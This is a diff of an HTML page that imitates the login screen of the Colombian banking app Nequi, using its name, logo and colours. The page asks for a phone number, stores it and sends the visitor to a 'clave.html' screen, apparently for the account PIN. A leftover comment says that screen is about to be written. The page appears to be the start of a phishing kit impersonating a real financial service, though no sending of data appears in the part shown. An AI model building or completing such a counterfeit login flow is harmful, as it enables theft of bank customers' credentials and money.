@@ -6,128 +6,105 @@
   <title>Nequi</title>
   <style>
     @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap');
-
-    * { margin: 0; padding: 0; box-sizing: border-box; }
-    body {
-      background: #2C0B3A;
-      font-family: 'Roboto', sans-serif;
-      height: 100vh;
+    
+    * { margin:0; padding:0; box-sizing:border-box; }
+    body { 
+      font-family: 'Roboto', sans-serif; 
+      background: #1F0A2E;
+      height: 100vh; 
       color: white;
       overflow: hidden;
     }
     .container {
       max-width: 420px;
       margin: 0 auto;
+      padding: 20px;
       height: 100vh;
-      position: relative;
-      background: linear-gradient(to bottom, #2C0B3A, #1F0829);
+      display: flex;
+      flex-direction: column;
     }
-
+    .header {
+      display: flex;
+      justify-content: flex-end;
+      padding: 15px 0;
+    }
     .help {
-      position: absolute;
-      top: 20px;
-      right: 20px;
-      width: 28px;
-      height: 28px;
+      width: 30px; height: 30px;
       border: 2px solid white;
       border-radius: 50%;
       display: flex;
       align-items: center;
       justify-content: center;
       font-size: 18px;
-      color: white;
     }
-
     .logo {
-      position: absolute;
-      top: 120px;
-      left: 50%;
-      transform: translateX(-50%);
-      font-size: 58px;
+      font-size: 52px;
       font-weight: 700;
+      text-align: center;
+      margin: 80px 0 100px 0;
       color: white;
     }
-    .logo-dot {
-      color: #FF2D95;
-    }
+    .logo span { color: #FF2D95; }
 
-    .input-box {
-      position: absolute;
-      top: 280px;
-      left: 30px;
-      right: 30px;
-      background: #3A1C4A;
-      border-radius: 8px;
-      padding: 4px;
+    .input-wrapper {
+      background: rgba(255,255,255,0.1);
+      border-radius: 12px;
+      padding: 5px;
+      margin-bottom: 30px;
     }
-
-    .input-inner {
-      background: #2C0B3A;
-      border-radius: 6px;
-      display: flex;
-      align-items: center;
-      padding: 0 10px;
-    }
-
-    .country {
-      color: #FF69B4;
-      font-weight: 500;
-      padding-right: 12px;
-      border-right: 2px solid #6B2B7A;
-    }
-
     input {
-      flex: 1;
-      background: transparent;
+      width: 100%;
+      background: #2A1840 !important;
+      color: white !important;
       border: none;
-      color: white;
+      border-radius: 8px;
+      padding: 18px 20px;
       font-size: 17px;
-      padding: 16px 14px;
       outline: none;
     }
-
     input::placeholder {
-      color: #B38BC9;
+      color: #B8A0D0;
     }
 
-    /* Fix para autocompletado */
+    /* === FIX FUERTE PARA EL FONDO BLANCO DEL AUTOCOMPLETADO === */
     input:-webkit-autofill,
     input:-webkit-autofill:hover,
-    input:-webkit-autofill:focus {
+    input:-webkit-autofill:focus,
+    input:-webkit-autofill:active {
       -webkit-text-fill-color: white !important;
-      -webkit-box-shadow: 0 0 0 30px #2C0B3A inset !important;
+      -webkit-box-shadow: 0 0 0 30px #2A1840 inset !important;
+      box-shadow: 0 0 0 30px #2A1840 inset !important;
+      background: #2A1840 !important;
+      transition: background-color 5000s ease-in-out 0s;
     }
 
     button {
-      position: absolute;
-      bottom: 80px;
-      left: 30px;
-      right: 30px;
-      background: linear-gradient(to right, #FF2D95, #E6007E);
+      margin-top: auto;
+      height: 58px;
+      background: #FF2D95;
       color: white;
       border: none;
-      height: 56px;
-      border-radius: 8px;
+      border-radius: 12px;
       font-size: 17px;
       font-weight: 500;
-      box-shadow: 0 4px 12px rgba(255, 45, 149, 0.3);
+      box-shadow: 0 4px 15px rgba(255, 45, 149, 0.4);
     }
   </style>
 </head>
 <body>
-
-  <div class="container" id="screen1">
-    <div class="help">?</div>
+  <div class="container">
+    <div class="header">
+      <div class="help">?</div>
+    </div>
     
-    <div class="logo">
-      <span class="logo-dot">■</span> Nequi
+    <div class="logo">Nequi <span>■</span></div>
+    
+    <div style="text-align:center; margin-bottom:20px; font-size:18px;">
+      Ingresa tu número de celular
     </div>
 
-    <div class="input-box">
-      <div class="input-inner">
-        <div class="country">+57</div>
-        <input type="tel" id="phone" placeholder="Ingresa tu cel" maxlength="10" inputmode="numeric" required>
-      </div>
+    <div class="input-wrapper">
+      <input type="tel" id="phone" placeholder="300 1234567" maxlength="10" inputmode="numeric">
     </div>
 
     <button onclick="nextScreen()">Entra</button>
@@ -137,11 +114,11 @@
     function nextScreen() {
       const phone = document.getElementById("phone").value.trim();
       if (phone.length < 10) {
-        alert("Por favor ingresa un número de celular válido");
+        alert("Por favor ingresa un número válido");
         return;
       }
       localStorage.setItem("phone", phone);
-      window.location.href = "clave.html";   // Vamos a crear la segunda pantalla ahora
+      window.location.href = "clave.html";
     }
   </script>
 </body>
